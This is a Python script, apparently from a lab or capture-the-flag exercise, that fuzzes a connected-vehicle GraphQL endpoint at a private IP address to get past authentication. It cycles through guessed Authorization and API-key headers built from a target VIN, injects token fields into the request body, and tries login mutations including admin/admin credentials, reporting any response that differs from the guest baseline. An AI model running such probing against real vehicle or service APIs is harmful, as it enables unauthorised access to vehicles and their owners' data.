import requests, itertools, json, base64
URL="http://10.230.164.2:8080/graphql"
BASE='{"data":{"vehicles":[{"label":"Guest demo vehicle","vin":"CV6000000DEMO0001"}]}}'
VIN="CV6FF52FEE9EDDD86"
def check(tag, **kw):
    try:
        r=requests.post(URL, timeout=6, **kw)
        t=r.text.strip()
        if t!=BASE:
            print(f"DIFF [{tag}] {r.status_code} {t[:300]}", flush=True)
        return t
    except Exception as e:
        print(f"ERR [{tag}] {e}", flush=True)

# 1. header auth values
vals=[VIN, "Bearer "+VIN, "Bearer CV6000000DEMO0001", "Basic "+base64.b64encode(f"{VIN}:{VIN}".encode()).decode(),
      "Bearer test", "Vehicle "+VIN, VIN.lower()]
for h in ["Authorization","X-Api-Key","X-Auth-Token","Token","X-Vehicle-Token","Api-Key"]:
    for v in vals:
        check(f"{h}={v[:20]}", headers={h:v, "Content-Type":"application/json"}, json={"query":"{vehicles{vin}}"})
# 2. top-level body keys
for k in ["vin","token","auth","authorization","apiKey","api_key","vehicle","vehicleId","accessToken","access_token","jwt"]:
    check(f"body.{k}", json={k:VIN, "query":"{vehicles{vin}}"})
    check(f"body.{k}.obj", json={k:{"vin":VIN}, "query":"{vehicles{vin}}"})
# 3. mutations
muts=[
 'mutation { login(username:"admin",password:"admin"){token} }',
 'mutation Login($u:String!,$p:String!){ login(username:$u,password:$p){ token } }',
 'mutation { authenticate(vin:"%s"){token} }' % VIN,
 'mutation { vehicleLogin(vin:"%s"){token} }' % VIN,
 'mutation { createSession(vin:"%s"){token} }' % VIN,
 'mutation { register(vin:"%s"){token} }' % VIN,
]
for m in muts:
    check("mut", json={"query":m})
print("done")
